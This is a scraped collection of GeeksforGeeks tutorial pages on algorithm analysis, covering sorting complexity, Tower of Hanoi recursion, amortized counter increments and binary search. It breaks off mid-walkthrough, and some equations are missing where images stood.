Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Analysis thumb_up 70 To-do Done 1.5 Based on 51 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Understanding Time Complexity with Simple Examples Next last_page Practice Set for Recurrence Relations Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeDifference between NP hard and NP complete problemComplexity Analysis of Binary SearchUnderstanding Time Complexity with Simple Examples More related articles in Analysis Time complexity of recursive Fibonacci programAnalysis of different sorting techniquesCyclomatic ComplexityProof that traveling salesman problem is NP HardAnalysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of different sorting techniques - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapComplexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisTail RecursionNP-Completeness | Set 1 (Introduction)Complexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsTime Complexity Analysis | Tower Of Hanoi (Recursion)Sort elements by frequency | Set 5 (using Java Map) Analysis of different sorting techniques Last Updated: 30-04-2019 In this article, we will discuss important properties of different sorting techniques including their complexity, stability and memory constraints. Before understanding this article, you should understand basics of different sorting techniques (See : Sorting Techniques). Time complexity Analysis – We have discussed the best, average and worst case complexity of different sorting techniques with possible scenarios. Comparison based sorting – In comparison based sorting, elements of an array are compared with each other to find the sorted array. Bubble sort and Insertion sort – Average and worst case time complexity: n^2 Best case time complexity: n when array is already sorted. Worst case: when the array is reverse sorted. Selection sort – Best, average and worst case time complexity: n^2 which is independent of distribution of data. Merge sort – Best, average and worst case time complexity: nlogn which is independent of distribution of data. Heap sort – Best, average and worst case time complexity: nlogn which is independent of distribution of data. Quick sort – It is a divide and conquer approach with recurrence relation: T(n) = T(k) + T(n-k-1) + cn Worst case: when the array is sorted or reverse sorted, the partition algorithm divides the array in two subarrays with 0 and n-1 elements. Therefore, T(n) = T(0) + T(n-1) + cn Solving this we get, T(n) = O(n^2) Best case and Average case: On an average, the partition algorithm divides the array in two subarrays with equal size. Therefore, T(n) = 2T(n/2) + cn Solving this we get, T(n) = O(nlogn) Non-comparison based sorting – In non-comparison based sorting, elements of array are not compared with each other to find the sorted array. Radix sort – Best, average and worst case time complexity: nk where k is the maximum number of digits in elements of array. Count sort – Best, average and worst case time complexity: n+k where k is the size of count array. Bucket sort – Best and average time complexity: n+k where k is the number of buckets. Worst case time complexity: n^2 if all elements belong to same bucket. In-place/Outplace technique – A sorting technique is inplace if it does not use any extra memory to sort the array. Among the comparison based techniques discussed, only merge sort is outplaced technique as it requires an extra array to merge the sorted subarrays. Among the non-comparison based techniques discussed, all are outplaced techniques. Counting sort uses a counting array and bucket sort uses a hash table for sorting the array. Online/Offline technique – A sorting technique is considered Online if it can accept new data while the procedure is ongoing i.e. complete data is not required to start the sorting operation. Among the comparison based techniques discussed, only Insertion Sort qualifies for this because of the underlying algorithm it uses i.e. it processes the array (not just elements) from left to right and if new elements are added to the right, it doesn’t impact the ongoing operation. Stable/Unstable technique – A sorting technique is stable if it does not change the order of elements with the same value. Out of comparison based techniques, bubble sort, insertion sort and merge sort are stable techniques. Selection sort is unstable as it may change the order of elements with the same value. For example, consider the array 4, 4, 1, 3. In the first iteration, the minimum element found is 1 and it is swapped with 4 at 0th position. Therefore, the order of 4 with respect to 4 at the 1st position will change. Similarly, quick sort and heap sort are also unstable. Out of non-comparison based techniques, Counting sort and Bucket sort are stable sorting techniques whereas radix sort stability depends on the underlying algorithm used for sorting. Analysis of sorting techniques : When the array is almost sorted, insertion sort can be preferred. When order of input is not known, merge sort is preferred as it has worst case time complexity of nlogn and it is stable as well. When the array is sorted, insertion and bubble sort gives complexity of n but quick sort gives complexity of n^2. Que – 1. Which sorting algorithm will take the least time when all elements of input array are identical? Consider typical implementations of sorting algorithms. (A) Insertion Sort (B) Heap Sort (C) Merge Sort (D) Selection Sort Solution: As discussed, insertion sort will have the complexity of n when the input array is already sorted. Que – 2. Consider the Quicksort algorithm. Suppose there is a procedure for finding a pivot element which splits the list into two sub-lists each of which contains at least one-fifth of the elements. Let T(n) be the number of comparisons required to sort n elements. Then, (GATE-CS-2012) (A) T(n) <= 2T(n/5) + n (B) T(n) <= T(n/5) + T(4n/5) + n (C) T(n) <= 2T(4n/5) + n (D) T(n) <= 2T(n/2) + n Solution: The complexity of quick sort can be written as: T(n) = T(k) + T(n-k-1) + cn As given in question, one list contains 1/5th of total elements. Therefore, another list will have 4/5 of total elements. Putting values, we get: T(n) = T(n/5) + T(4n/5) + cn, which matches option (B). Time and Space Complexity Comparison Table : Sorting Algorithm Time Complexity Space Complexity Best Case Average Case Worst Case Worst Case Bubble Sort Ω(N) Θ(N2) O(N2) O(1) Selection Sort Ω(N2) Θ(N2) O(N2) O(1) Insertion Sort Ω(N) Θ(N2) O(N2) O(1) Merge Sort Ω(N log N) Θ(N log N) O(N log N) O(N) Heap Sort Ω(N log N) Θ(N log N) O(N log N) O(1) Quick Sort Ω(N log N) Θ(N log N) O(N2) O(N log N) Radix Sort Ω(N k) Θ(N k) O(N k) O(N + k) Count Sort Ω(N + k) Θ(N + k) O(N + k) O(k) Bucket Sort Ω(N + k) Θ(N + k) O(N2) O(N) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Asymptotic Analysis and comparison of sorting algorithmsDatabase Recovery Techniques in DBMSCongestion Control techniques in Computer NetworksTechniques to handle ThrashingResource Allocation Techniques for ProcessesConcurrency Control TechniquesImplementation of Contiguous Memory Management TechniquesImplementing Non-contiguous Memory Management TechniquesLoop Optimization Techniques | Set 2Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 5 (Practice Problems)Introduction of Lexical AnalysisIntroduction to Syntax Analysis in Compiler DesignFIRST Set in Syntax AnalysisFOLLOW Set in Syntax AnalysisAnalysis of algorithms | little o and little omega notationsThis article is contributed by Sonal Tuteja. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : Akshay Gaursundar, mdamircoder Article Tags : AnalysisGATE CS thumb_up 35 To-do Done 1.8 Based on 12 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Different types of recurrence relations and their solutions Next last_page Problem Solving for Minimum Spanning Trees (Kruskal’s and Prim’s) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsSet cover is NP Complete Most visited in GATE CS Layers of OSI ModelACID Properties in DBMSPage Replacement Algorithms in Operating SystemsFunctions of Operating SystemTypes of Operating Systems room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Time Complexity Analysis | Tower Of Hanoi (Recursion) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapComplexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisAnalysis of different sorting techniquesTail RecursionNP-Completeness | Set 1 (Introduction)Complexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsSort elements by frequency | Set 5 (using Java Map) Time Complexity Analysis | Tower Of Hanoi (Recursion) Last Updated: 27-02-2018 Tower of Hanoi is a mathematical puzzle where we have three rods and n disks. The objective of the puzzle is to move the entire stack to another rod, obeying the following simple rules: 1) Only one disk can be moved at a time. 2) Each move consists of taking the upper disk from one of the stacks and placing it on top of another stack i.e. a disk can only be moved if it is the uppermost disk on a stack. 3) No disk may be placed on top of a smaller disk. Pseudo Code TOH(n, x, y, z) { if (n >= 1) { // put (n-1) disk to z by using y TOH((n-1), x, z, y) // move larger disk to right place move:x-->y // put (n-1) disk to right place TOH((n-1), z, y, x) } } Analysis of Recursion Recursive Equation : ——-equation-1 Solving it by BackSubstitution : ———–equation-2 ———–equation-3 Put value of T(n-2) in equation–2 with help of equation-3 ——equation-4 Put value of T(n-1) in equation-1 with help of equation-4 After Generalization : Base condition T(0) == 1 n – k = 0 n = k; put, k = n It is GP series, and sum is , or you can say which is exponentioal Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Recursive Tower of Hanoi using 4 pegs / rodsCost Based Tower of HanoiTwisted Tower of Hanoi ProblemProgram for Tower of HanoiPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary SearchComplexity analysis of various operations of Binary Min HeapAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Time Complexity of building a heapAn interesting time complexity questionTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallyTime complexity of recursive Fibonacci programPython Code for time Complexity plot of Heap SortC program for Time Complexity plot of Bubble, Insertion and Selection Sort using GnuplotTime Complexity of Loop with PowersA Time Complexity QuestionShubham Pandey 5Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : AnalysisRecursion Practice Tags : Recursion thumb_up 8 To-do Done 3.4 Based on 7 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Time taken by Loop unrolling vs Normal loop Next last_page Analysis of Algorithms | Big-O analysis Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsApplications of Hashing Most visited in Recursion Given an array A[] and a number x, check for pair in A[] with sum as xRecursionWrite a program to print all permutations of a given stringProgram for Tower of HanoiWrite a program to reverse digits of a number room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Amortized analysis for increment in counter - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Introduction of Boolean Algebra and Logic Gatesexpand_moreDigital Electronics and Logic Design TutorialsIntroduction of Logic GatesProperties of Boolean AlgebraMinimization of Boolean FunctionsRepresentation of Boolean FunctionsCanonical and Standard FormFunctional Completeness in Digital LogicIntroduction of K-Map (Karnaugh Map)Various Implicants in K-MapPDNF and PCNF in Discrete MathematicsVariable Entrant Map (VEM) in Digital LogicConsensus Theorem in Digital LogicDifference between combinational and sequential circuitCombinational Circuitsexpand_moreHalf Adder in Digital LogicFull Adder in Digital LogicHalf Subtractor in Digital LogicFull Subtractor in Digital LogicHalf Adder and Half Subtractor using NAND NOR gatesEncoders and Decoders in Digital LogicEncoder in Digital LogicBinary Decoder in Digital LogicCombinational circuits using DecoderMultiplexers in Digital LogicCarry Look-Ahead AdderParallel Adder and Parallel SubtractorBCD Adder in Digital LogicMagnitude Comparator in Digital LogicBCD to 7 Segment DecoderProgrammable Logic ArrayProgramming Array LogicClassification and Programming of Read-Only Memory (ROM)Sequential Circuitsexpand_moreIntroduction of Sequential CircuitsFlip-flop types, their Conversion and ApplicationsSynchronous Sequential Circuits in Digital LogicCounters in Digital LogicRing Counter in Digital Logicn-bit Johnson Counter in Digital LogicRipple Counter in Digital LogicDesign counter for given sequenceMaster-Slave JK Flip FlopAsynchronous Sequential CircuitsShift Registers in Digital LogicDesign 101 sequence detector (Mealy machine)Amortized analysis for increment in counterNumber Representation and Computer Airthmeticexpand_moreNumber System and Base ConversionsCode Converters – BCD(8421) to/from Excess-3Code Converters – Binary to/from Gray CodeProgram for Decimal to Binary ConversionProgram for Binary To Decimal ConversionProgram for Decimal to Octal ConversionProgram for Octal to Decimal ConversionProgram for Hexadecimal to DecimalComputer Arithmetic | Set – 1Computer Arithmetic | Set – 2Introduction of Floating Point RepresentationWhat’s difference between 1’s Complement and 2’s Complement?Computer Organization | Booth’s AlgorithmRestoring Division Algorithm For Unsigned IntegerNon-Restoring Division For Unsigned IntegerDLD GATE Questionsexpand_moreDigital Logic & Number representationNumber Representation Amortized analysis for increment in counter Last Updated: 26-07-2019 Amortized analysis refers to determining the time-averaged running time for a sequence (not an individual) operation. It is different from average case analysis because here, we don’t assume that the data arranged in average (not very bad) fashion like we do for average case analysis for quick sort. That is, amortized analysis is worst case analysis but for a sequence of operation rather than an individual one. It applies to the method that consists of the sequence of operation, where a vast majority of operations are cheap but some of the operations are expensive. This can be visualized with the help of binary counter which is implemented below. Let’s see this by implementing an increment counter in C. First, let’s see how counter increment works. Let a variable i contains a value 0 and we performs i++ many time. Since on hardware, every operation is performed in binary form. Let binary number stored in 8 bit. So, value is 00000000. Let’s increment many time. So, the pattern we find are as : 00000000, 00000001, 00000010, 00000011, 00000100, 00000101, 00000110, 00000111, 00001000 and so on ….. Steps : 1. Iterate from rightmost and make all one to zero until finds first zero. 2. After iteration, if index is greater than or equal to zero, then make zero lie on that position to one. Recommended: Please try your approach on {IDE} first, before moving on to the solution. filter_none edit close play_arrow link brightness_4 code #include <bits / stdc++.h> using namespace std; int main() { char str[] = "10010111"; int length = strlen(str); int i = length - 1; while (str[i] == '1') { str[i] = '0'; i--; } if (i >= 0) str[i] = '1'; printf("% s", str); } chevron_right filter_none Output: 10011000 On a simple look on program or algorithm, its running cost looks proportional to the number of bits but in real, it is not proportional to a number of bits. Let’s see how! Let’s assume that increment operation is performed k time. We see that in every increment, its rightmost bit is getting flipped. So, the number of flipping for LSB is k. For, second rightmost is flipped after a gap, i.e., 1 time in 2 increments. 3rd rightmost – 1 time in 4 increments. 4th rightmost – 1 time in 8 increments. So, the number of flipping is k/2 for 2nd rightmost bit, k/4 for 3rd rightmost bit, k/8 for 4th rightmost bit and so on … Total cost will be the total number of flipping, that is, C(k) = k + k/2 + k/4 + k/8 + k/16 + …… which is Geometric Progression series and also, C(k) < k + k/2 + k/4 + k/8 + k/16 + k/32 + …… up to infinity So, C(k) < k/(1-1/2) and so, C(k) < 2k So, C(k)/k < 2 Hence, we find that average cost for increment a counter for one time is constant and it does not depend on the number of bit. We conclude that increment of a counter is constant cost operation. References : http://www.cs.cornell.edu/courses/cs3110/2013sp/supplemental/recitations/rec21.html http://faculty.cs.tamu.edu/klappi/csce411-s17/csce411-amortized3.pdf Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Difference between Straight Ring Counter and Twisted Ring CounterAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Ripple Counter in Digital Logicn-bit Johnson Counter in Digital LogicDifferences between Synchronous and Asynchronous CounterMod 6 Johnson Counter (with D flip-flop)Mod 2 Ring Counter (with D flip-flop)Non-binary Counter in Digital LogicSynchronous Series Carry CounterSelf Starting CounterFree Running CounterRing Counter in Digital LogicDesign counter for given sequenceMinimum increment or decrement operations required to make the array sortedAnalysis of Algorithm | Set 4 (Solving Recurrences)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of Algorithms | Set 5 (Practice Problems)kaditya139Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : Akanksha_Rai, shubham_singh Article Tags : AnalysisDigital Electronics & Logic Design thumb_up 3 To-do Done 3 Based on 2 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Operational Amplifier (op-amp) in Digital Electronics Next last_page Restoring Division Algorithm For Unsigned Integer Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Difference between NP hard and NP complete problemAnalysis of Algorithms | Set 3 (Asymptotic Notations) Most visited in Digital Electronics & Logic Design Serial Binary Adder in Digital LogicDifference between Half adder and full adderDifferences between Synchronous and Asynchronous CounterDifference between Unipolar, Polar and Bipolar Line Coding SchemesIEEE Standard 754 Floating Point Numbers room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Complexity Analysis of Binary Search - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Complexity Analysis of Binary SearchBinary SearchProgram to check if a given number is Lucky (all digits are different)Lucky NumbersWrite a program to add two numbers in base 14Babylonian method for square rootSquare root of an integerFind square root of number upto given precision using binary searchLinear SearchLinear Search vs Binary SearchInterpolation search vs Binary searchInterpolation SearchExponential SearchWhy is Binary Search preferred over Ternary Search?Ternary SearchStooge SortPython Program for Stooge SortPython Program for Insertion SortPython Program for Selection SortPython Program for Bubble SortBubble SortRecursionA* Search AlgorithmDifference between BFS and DFSHow to write a Pseudo Code?Data Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsPlayfair Cipher with ExamplesConverting Roman Numerals to Decimal lying between 1 to 3999Commonly Asked Algorithm Interview Questions | Set 1 Complexity Analysis of Binary Search Last Updated: 30-09-2019 Complexities like O(1) and O(n) are simple to understand. O(1) means it requires constant time to perform operations like to reach an element in constant time as in case of dictionary and O(n) means, it depends on the value of n to perform operations such as searching an element in an array of n elements. But for O(Log n), it is not that simple. Let us discuss this with the help of Binary Search Algorithm whose complexity is O(log n). Binary Search: Search a sorted array by repeatedly dividing the search interval in half. Begin with an interval covering the whole array. If the value of the search key is less than the item in the middle of the interval, narrow the interval to the lower half. Otherwise, narrow it to the upper half. Repeatedly check until the value is found or the interval is empty. Example: Sorted Array of 10 elements: 2, 5, 8, 12, 16, 23, 38, 56, 72, 91 Let us say we want to search for 23. Finding the given element: Now to find 23, there will be many iterations with each having steps as mentioned in the figure above: Iteration 1: Array: 2, 5, 8, 12, 16, 23, 38, 56, 72, 91 Select the middle element. (here 16) Since 23 is greater than 16, so we divide the array into two halves and consider the sub-array after element 16. Now this subarray with the elements after 16 will be taken into next iteration. Iteration 2: Array: 23, 38, 56, 72, 91 Select the middle element. (now 56) Since 23 is smaller than 56, so we divide the array into two halves and consider the sub-array before element 56. Now this subarray with the elements before 56 will be taken into next iteration. Iteration 3: Array: 23, 38 Select the middle element. (now 23) Since 23 is the middle element. So the iterations will now stop. 